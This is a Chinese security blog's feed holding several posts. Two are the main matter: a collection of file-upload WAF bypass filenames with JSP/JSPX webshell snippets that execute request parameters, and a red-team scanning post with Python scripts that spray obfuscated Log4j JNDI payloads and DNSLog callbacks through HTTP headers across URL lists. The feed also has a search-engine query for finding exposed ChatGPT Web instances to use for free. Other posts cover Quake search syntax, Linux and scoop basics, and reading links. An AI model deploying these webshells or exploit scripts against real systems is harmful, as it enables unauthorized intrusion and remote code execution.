    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>国内搜索引擎越来越多，fofa,hunter，zoomeye，当然也包括quake，当初是看重他的漏洞库才开的会员，奈何不向普通会员开放，那要你有啥用，不过买都买了，不如就了解如何去正常如使用他。</p><h1 id="搜索语法">搜索语法</h1><p>官方的文档：https://quake.360.net/quake/#/help?id=5eb238f110d2e850d5c6aec8&amp;title=%E6%A3%80%E7%B4%A2%E5%85%B3%E9%94%AE%E8%AF%8D</p><p>先放一些官方文档可能没有的检索字段：</p><ul><li><p>is_domain:"true" 查询有域名的资产</p></li><li><p>type: "蜜罐(honeypot)" 查询quake判断是蜜罐的资产</p></li></ul><h1 id="其他语法示例">其他语法示例</h1><ul><li><code>response:"&lt;title&gt;系统&lt;/title&gt;"</code>:全匹配title,垃圾quake,不生效。</li><li><code>app:"扫描黑洞"</code>:目标IP开放端口大于一个阈值，就会被标注为扫描黑洞</li></ul><h2 id="查询一些存在漏洞的语法">查询一些存在漏洞的语法</h2><ul><li>title:"Index of/"，这个语法会匹配到index,而且没办法使用not进行排除，建议使用全匹配。</li></ul><img src="/2023/04/17/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2/quake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/image-20230417104830535.png" class="" title="image-20230417104830535"><ul><li><code>response:"&amp;lt;dir&amp;gt;"</code></li></ul><img src="/2023/04/17/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2/quake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/image-20230417105206092.png" class="" title="image-20230417105206092"><h1 id="quake特色">quake特色</h1><p>不开启排除蜜罐，蜜罐永远靠前，绝绝子</p><img src="/2023/04/17/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2/quake%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/image-20230417104609245.png" class="" title="image-20230417104609245">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
&lt;p&gt;国内搜索引擎越来越多，fofa,hunter，zoomeye，当然也包括quake，当初是看重他的漏洞库才开的会员，奈何不向普通会员开放，那要你有啥用，不过买都买了，不如就了解如何去正常如使用他。&lt;/p&gt;
&lt;h1 id=&quot;搜索语法&quot;&gt;</summary>
      
    
    
    
    
    <category term="quake" scheme="https://blog.njcit.me/tags/quake/"/>
    
    <category term="网络空间搜索引擎" scheme="https://blog.njcit.me/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"/>
    
  </entry>
  
  <entry>
    <title>文件上传绕过waf姿势收集</title>
    <link href="https://blog.njcit.me/2023/03/23/waf_bypass/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://blog.njcit.me/2023/03/23/waf_bypass/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</id>
    <published>2023-03-23T01:27:44.000Z</published>
    <updated>2023-03-23T02:48:49.365Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>现在渗透测试基本都会遇到waf，有waf就会封ip，有waf就要fuzz,记录一下从网上收集到的常用的文件上传的姿势，不一定能用，说不定下次就遇到了呢。</p><h1 id="正文">正文</h1><h2 id="后缀绕过">后缀绕过</h2><p>白名单基本没戏，洗洗睡吧。记录一下遇到的黑名单绕过。</p><h3 id="jsp">jsp</h3><ul><li>1.jpg\.jsp/ 以下内容可以尝试换行试一下</li><li>filename='shell.jspx.jsp'</li><li>filename=shell.jspx.jsp</li><li>filename=shell.jspx.jsp'</li><li>"filename"=shell.jspx;</li><li>filename=shell.jpg;filename=shell.jspx;</li><li>filename=shell.jspx;filename=shell.jpg;</li><li>FileName=shell.jspx.jsp'</li><li>FileName=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaashell.jspx.jsp'</li><li>FileName =shell.jspx（加空格）</li><li>filename===="shell.jspx.jsp1"（加等号）</li><li>FileName =shell.jspx</li><li>FileName=shell.jspx. jsp</li><li>File Name=shell.jspx.jsp'</li></ul><h2 id="内容绕过">内容绕过</h2><p>jsp利用EL表达式绕过</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jsp">$&#123;Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;x&quot;</span>))&#125;<br></code></pre></td></tr></table></figure><p>jspx利用命名空间绕过:http://127.0.0.1:8080/test.jsp?ccadmin=whoami,其中bbb可以任意替换</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css">&lt;bbb<span class="hljs-selector-pseudo">:root</span> xmlns:bbb=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span> version=<span class="hljs-string">&quot;1.2&quot;</span>&gt;<br>    &lt;bbb:scriptlet&gt;<br>    Runtime.<span class="hljs-built_in">getRuntime</span>().<span class="hljs-built_in">exec</span>(request.<span class="hljs-built_in">getParameter</span>(<span class="hljs-string">&quot;ccadmin&quot;</span>));    <br>&lt;/bbb:scriptlet&gt;&gt;<br>&lt;/bbb:root&gt;<br></code></pre></td></tr></table></figure><p>jspx利用jsp:expression绕过</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">&lt;bb<span class="hljs-variable">b:root</span> xmln<span class="hljs-variable">s:bbb</span>=<span class="hljs-string">&quot;http://java.sun.com/JSP/Page&quot;</span> <span class="hljs-keyword">version</span>=<span class="hljs-string">&quot;1.2&quot;</span>&gt;<br>    &lt;bb<span class="hljs-variable">b:expression</span>&gt;<br>    Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;ccadmin&quot;</span>))<br>&lt;/bb<span class="hljs-variable">b:expression</span>&gt;<br>&lt;/bb<span class="hljs-variable">b:root</span>&gt;<br></code></pre></td></tr></table></figure><h1 id="参考内容">参考内容</h1><ul><li>https://xz.aliyun.com/t/10515</li><li>https://yzddmr6.com/posts/jsp-webshell-upload-bypass/</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
&lt;p&gt;现在渗透测试基本都会遇到waf，有waf就会封ip，有waf就要fuzz,记录一下从网上收集到的常用的文件上传的姿势，不一定能用，说不定下次就遇到了呢。&lt;/p&gt;
&lt;h1 id=&quot;正文&quot;&gt;正文&lt;/h1&gt;
&lt;h2 id=&quot;后缀绕过&quot;&gt;后缀</summary>
      
    
    
    
    
    <category term="waf" scheme="https://blog.njcit.me/tags/waf/"/>
    
    <category term="bypass" scheme="https://blog.njcit.me/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>AI相关</title>
    <link href="https://blog.njcit.me/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/"/>
    <id>https://blog.njcit.me/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/</id>
    <published>2023-03-22T08:27:44.000Z</published>
    <updated>2023-08-02T01:14:10.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="链接">链接</h1><ul><li><p>https://chat.openai.com/chat</p><p>貌似是通过udp判断IP，建议使用美国的IP</p></li></ul><img src="/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/image-20230322163014374.png" class="" title="image-20230322163014374"><ul><li>https://www.bing.com/new 国内要使用插件修改header,貌似dev不用</li></ul><img src="/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/image-20230322170113101.png" class="" title="image-20230322170113101"><ul><li>https://bard.google.com/</li></ul><img src="/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/image-20230423083633416.png" class="" title="image-20230423083633416"><ul><li>https://yiyan.baidu.com/welcome</li></ul><img src="/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/image-20230423083023088.png" class="" title="image-20230423083023088"><ul><li><p>https://tongyi.aliyun.com/</p></li><li><p>https://weibo.com/u/1727858283</p></li><li><p>https://slack.com/apps/A04KGS7N9A8-claude?selected_team_id=T03G6H0A6&amp;tab=more_info&amp;continueFlag=9bd5d9031215cfb669b8ae72708f7318</p></li></ul><img src="/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/image-20230423090311349.png" class="" title="image-20230423090311349"><ul><li>https://open-assistant.io/zh/chat</li></ul><img src="/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/image-20230423090202435.png" class="" title="image-20230423090202435"><p># 白嫖</p><p>quake语法：title: "ChatGPT Web"</p><p>https://quake.360.net/quake/#/searchResult?searchVal=title%3A%22chatgpt%22%20AND%20title%3A%20%22ChatGPT%20Web%22&amp;selectIndex=quake_service&amp;ignore_cache=false&amp;timeRange=&amp;timeRange=&amp;latest=true&amp;t=1679475514161</p><p><img src="/2023/03/22/%E6%9D%82%E9%A1%B9/AI%E7%9B%B8%E5%85%B3/image-20230322165916603.png" class="" title="image-20230322165916603"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;链接&quot;&gt;链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;https://chat.openai.com/chat&lt;/p&gt;
&lt;p&gt;貌似是通过udp判断IP，建议使用美国的IP&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&quot;/2023/03/22/%E6%9D%82%E9</summary>
      
    
    
    
    
    <category term="AI" scheme="https://blog.njcit.me/tags/AI/"/>
    
  </entry>
  
  <entry>
    <title>反序列化学习资料</title>
    <link href="https://blog.njcit.me/2023/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"/>
    <id>https://blog.njcit.me/2023/03/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/</id>
    <published>2023-03-22T01:07:17.000Z</published>
    <updated>2023-03-22T08:19:20.963Z</updated>
    
    <content type="html"><![CDATA[<h1 id="资料链接">资料链接</h1><ul><li>Java安全漫谈：https://github.com/phith0n/JavaThings</li><li>Java反序列化漏洞学习 CommonsCollection：https://tttang.com/archive/1337/</li><li>反序列化分析到shiro注入WebSocket内存马：https://xz.aliyun.com/t/12042</li><li>TemplatesImpl利用链与Fastjson注入内存马：https://xz.aliyun.com/t/12085</li><li>从0到1的fastjson的反序列化漏洞分析：https://xz.aliyun.com/t/12096</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;资料链接&quot;&gt;资料链接&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Java安全漫谈：https://github.com/phith0n/JavaThings&lt;/li&gt;
&lt;li&gt;Java反序列化漏洞学习 Commons
Collection：https://tttang.com/</summary>
      
    
    
    
    
    <category term="代码审计" scheme="https://blog.njcit.me/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="反序列化" scheme="https://blog.njcit.me/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Linux基础命令</title>
    <link href="https://blog.njcit.me/2023/02/21/%E6%9D%82%E9%A1%B9/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
    <id>https://blog.njcit.me/2023/02/21/%E6%9D%82%E9%A1%B9/Linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</id>
    <published>2023-02-21T07:43:37.000Z</published>
    <updated>2023-02-21T08:24:24.017Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>好多命令平时用的少，经常忘，在此做一次记录。</p><h1 id="正文">正文</h1><h2 id="ubuntu修改主机名">Ubuntu修改主机名</h2><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dsconfig"><span class="hljs-string">sudo</span> <span class="hljs-string">hostnamectl</span> <span class="hljs-built_in">set-hostname</span> <span class="hljs-string">ty</span><br></code></pre></td></tr></table></figure><h2 id="ubuntu修改ssh欢迎信息">Ubuntu修改SSH欢迎信息</h2><p>修改/etc/update-motd.d/目录下面的文件即可，不行就重启一下</p><h2 id="ssh密钥登录">SSH密钥登录</h2><p>把公钥放在.ssh/authorized_keys中即可</p><h2 id="scp">scp</h2><p>指定端口：scp -P 2233 get_info.shliemer@192.168.76.52:/usr/local/src</p><p>传输目录scp -r /opt/ liemer@192.168.76.52:/usr/local/src</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
&lt;p&gt;好多命令平时用的少，经常忘，在此做一次记录。&lt;/p&gt;
&lt;h1 id=&quot;正文&quot;&gt;正文&lt;/h1&gt;
&lt;h2 id=&quot;ubuntu修改主机名&quot;&gt;Ubuntu修改主机名&lt;/h2&gt;
&lt;figure class=&quot;highlight dsconfi</summary>
      
    
    
    
    
    <category term="Linux" scheme="https://blog.njcit.me/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>scoop基础使用</title>
    <link href="https://blog.njcit.me/2023/02/19/%E6%9D%82%E9%A1%B9/scoop%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/"/>
    <id>https://blog.njcit.me/2023/02/19/%E6%9D%82%E9%A1%B9/scoop%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</id>
    <published>2023-02-19T10:06:47.000Z</published>
    <updated>2023-02-19T10:28:18.582Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>scoop是一个包管理软件，可以通过一条命令安装/更新卸载软件，scoop拥有大量软件，基本上常用的软件都在scoop里面能找到。# 安装 ## 安装 建议使用pwsh和Windows终端 <figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Set</span>-ExecutionPolicy RemoteSigned -<span class="hljs-keyword">Scope</span> CurrentUser<br>irm get.scoop.sh | <span class="hljs-type">iex</span><br></code></pre></td></tr></table></figure> ##配置额外的bucket 查看bucket列表 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scoop </span><span class="hljs-keyword">bucket </span>known<br><br>main<br><span class="hljs-keyword">extras</span><br><span class="hljs-keyword"></span>versions<br>nirsoft<br>sysinternals<br>php<br>nerd-fonts<br>nonportable<br><span class="hljs-keyword">java</span><br><span class="hljs-keyword"></span>games<br></code></pre></td></tr></table></figure> 添加bucket(要先安装git)<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scoop </span><span class="hljs-keyword">bucket </span><span class="hljs-keyword">add </span><span class="hljs-keyword">extras</span><br></code></pre></td></tr></table></figure> 查看本地的bucket列表 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scoop </span><span class="hljs-keyword">bucket </span>list<br></code></pre></td></tr></table></figure>修改安装位置,注意：已经安装的软件可能出现问题，建议重新安装。<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$env</span><span class="hljs-symbol">:SCOOP=<span class="hljs-string">&#x27;D:\Applications\Scoop&#x27;</span></span><br>[<span class="hljs-title class_">Environment</span>]::<span class="hljs-title class_">SetEnvironmentVariable</span>(<span class="hljs-string">&#x27;SCOOP&#x27;</span>, <span class="hljs-variable">$env</span><span class="hljs-symbol">:SCOOP</span>, <span class="hljs-string">&#x27;User&#x27;</span>)<br><span class="hljs-variable">$env</span><span class="hljs-symbol">:SCOOP_GLOBAL=<span class="hljs-string">&#x27;F:\GlobalScoopApps&#x27;</span></span><br>[<span class="hljs-title class_">Environment</span>]::<span class="hljs-title class_">SetEnvironmentVariable</span>(<span class="hljs-string">&#x27;SCOOP_GLOBAL&#x27;</span>, <span class="hljs-variable">$env</span><span class="hljs-symbol">:SCOOP_GLOBAL</span>, <span class="hljs-string">&#x27;Machine&#x27;</span>)<br></code></pre></td></tr></table></figure> # 参考链接 - https://scoop.sh/</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
&lt;p&gt;scoop是一个包管理软件，可以通过一条命令安装/更新卸载软件，scoop拥有大量软件，基本上常用的软件都在scoop里面能找到。
# 安装 ## 安装 建议使用pwsh和Windows终端 &lt;figure class=&quot;highli</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>漏洞扫描</title>
    <link href="https://blog.njcit.me/2023/02/17/%E5%8D%8E%E4%B8%BA%E8%A1%8C%E5%8A%A8/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    <id>https://blog.njcit.me/2023/02/17/%E5%8D%8E%E4%B8%BA%E8%A1%8C%E5%8A%A8/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/</id>
    <published>2023-02-17T06:14:22.000Z</published>
    <updated>2023-08-03T08:32:36.503Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言">前言</h1><p>一场比赛最重要的环节就是外网打点，外网没点进不了内网一切都白瞎，在我的印象中，这几年比较火的漏洞是shiro550/springboot rce/log4jrce。第一时间肯定要先扫描提供的资产是不是存在上面的漏洞，快速打点。当然各大oa还财务系统也存在各种漏洞。# 批量漏洞扫描 ## log4j</p><p>fuzz spring</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> api.read_file<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> hashlib<br>urllib3.disable_warnings()<br>q = <span class="hljs-string">b&#x27;icon_hash=&quot;116323821&quot; &amp;&amp; country=&quot;CN&quot;&#x27;</span><br><br><span class="hljs-comment"># url_list = api.fofa_api.get_url(base64.b64encode(q), 4)</span><br>url_list = api.read_file.get_url_list(<span class="hljs-string">&#x27;url.txt&#x27;</span>)<br>hl = hashlib.md5()<br><span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> url_list:<br>    hl.update(url.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(url + <span class="hljs-string">&#x27;\t\t&#x27;</span> + hl.hexdigest())<br>    dnslog = <span class="hljs-string">&#x27;dnslog&#x27;</span><br>    accept = <span class="hljs-string">&#x27;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;: $&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:// &#x27;</span> + hl.hexdigest()[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>] + dnslog + <span class="hljs-string">&#x27;/poc&#125;&#x27;</span><br>    header = &#123;<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: accept<br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        r = requests.get(url, headers=header, timeout=<span class="hljs-number">5</span>, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请求出现异常&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>fuzz 全部header</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> api.read_file<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> hashlib<br>urllib3.disable_warnings()<br><br>url_list = api.read_file.get_url_list(<span class="hljs-string">&#x27;url.txt&#x27;</span>)<br>hl = hashlib.md5()<br><span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> url_list:<br>    hl.update(url.encode(encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    <span class="hljs-built_in">print</span>(url + <span class="hljs-string">&#x27;\t\t&#x27;</span> + hl.hexdigest())<br>    dnslog = <span class="hljs-string">&#x27;dnslog&#x27;</span><br>    poc = <span class="hljs-string">&#x27;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;: $&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;:// &#x27;</span> + hl.hexdigest()[<span class="hljs-number">0</span>:<span class="hljs-number">5</span>] + dnslog + <span class="hljs-string">&#x27;/poc&#125;&#x27;</span><br>    header = &#123;<br>        <span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;accept&#x27;</span> + <span class="hljs-string">&#x27;.&#x27;</span> + poc,<br>        <span class="hljs-string">&#x27;X-Client-IP&#x27;</span>: <span class="hljs-string">&#x27;X-Client-IP&#x27;</span> + <span class="hljs-string">&#x27;.&#x27;</span> + poc,<br>        <span class="hljs-string">&#x27;X-Remote-IP&#x27;</span>: <span class="hljs-string">&#x27;X-Remote-IP&#x27;</span> + <span class="hljs-string">&#x27;.&#x27;</span> + poc,<br>        <span class="hljs-string">&#x27;X-Remote-Addr&#x27;</span>: <span class="hljs-string">&#x27;X-Remote-Addr&#x27;</span> + <span class="hljs-string">&#x27;.&#x27;</span> + poc,<br>        <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span> + <span class="hljs-string">&#x27;.&#x27;</span> + poc,<br>        <span class="hljs-string">&#x27;X-Originating-IP&#x27;</span>: <span class="hljs-string">&#x27;X-Originating-IP&#x27;</span> + <span class="hljs-string">&#x27;.&#x27;</span> + poc,<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;User-Agent&#x27;</span> + <span class="hljs-string">&#x27;.&#x27;</span> + poc,<br>        <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;Referer&#x27;</span> + <span class="hljs-string">&#x27;.&#x27;</span> + poc,<br>        <span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;Authorization&#x27;</span> + <span class="hljs-string">&#x27;.&#x27;</span> + poc<br><br>    &#125;<br>    <span class="hljs-keyword">try</span>:<br>        r = requests.get(url, headers=header, timeout=<span class="hljs-number">5</span>, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;请求出现异常&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="shiro">shiro</h2><p>直接把所有流量走一遍burpsuite或者xray，效率最高。</p><h1 id="telnet-无密码">telnet 无密码</h1><p>使用webfinder-3.2可以扫描telnet默认密码</p><h1id="dirsearch使用自定义字典进行批量扫描">dirsearch使用自定义字典进行批量扫描</h1><p>python ..py -w D:.txt -l "C:.txt" -p socks5://127.0.0.1:7772</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/actuator/</span>env<br><span class="hljs-regexp">/admin/</span>v2/api-docs<br><span class="hljs-regexp">/api/</span>actuator/env<br><span class="hljs-regexp">/api/</span>druid/index.html<br><span class="hljs-regexp">/api/</span>env<br><span class="hljs-regexp">/api/</span>v1/api-docs<br><span class="hljs-regexp">/api/</span>v2/api-docs<br><span class="hljs-regexp">/api/</span>v3/api-docs<br><span class="hljs-regexp">/druid/i</span>ndex.html<br>/env<br><span class="hljs-regexp">/nacos/</span><br>/service<br>/Service.asmx?wsdl<br><span class="hljs-regexp">/statics/u</span>editor<span class="hljs-regexp">/php/</span>controller.php?action=uploadfile<br>/swagger-ui.html<br><span class="hljs-regexp">/swagger/</span>v1/swagger.json<br><span class="hljs-regexp">/UEditor/</span>asp/controller.asp?action=uploadfile<br><span class="hljs-regexp">/ueditor/</span>php/controller.php?action=uploadfile<br><span class="hljs-regexp">/v1/</span>api-docs<br><span class="hljs-regexp">/v2/</span>api-docs<br><span class="hljs-regexp">/v3/</span>api-docs<br></code></pre></td></tr></table></figure><h1 id="xray多线程扫描">xray多线程扫描</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> subprocess<br><br>file_path = <span class="hljs-string">&#x27;../asset/out&#x27;</span><br><span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> os.listdir(file_path):<br>    t = time.time()<br>    html_filename = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(t)) + <span class="hljs-string">&quot;&quot;</span>.join(random.sample(string.ascii_letters + string.digits, <span class="hljs-number">5</span>)) + <span class="hljs-string">&#x27;.html&#x27;</span><br>    cmd = [<span class="hljs-string">&#x27;xray&#x27;</span>, <span class="hljs-string">&#x27;ws&#x27;</span>, <span class="hljs-string">&#x27;--url-file&#x27;</span>, filename, <span class="hljs-string">&#x27;--html-output&#x27;</span>, html_filename]<br>    subprocess.Popen(cmd, creationflags=subprocess.CREATE_NEW_CONSOLE)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;前言&lt;/h1&gt;
&lt;p&gt;一场比赛最重要的环节就是外网打点，外网没点进不了内网一切都白瞎，在我的印象中，这几年比较火的漏洞是shiro
550/springboot rce/log4j
rce。第一时间肯定要先扫描提供的资产是不是存在上面的漏洞，快速打点。当然</summary>
      
    
    
    
    
    <category term="hvv" scheme="https://blog.njcit.me/tags/hvv/"/>
    
    <category term="漏洞扫描" scheme="https://blog.njcit.me/tags/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F/"/>
    
  </entry>
  
</feed>
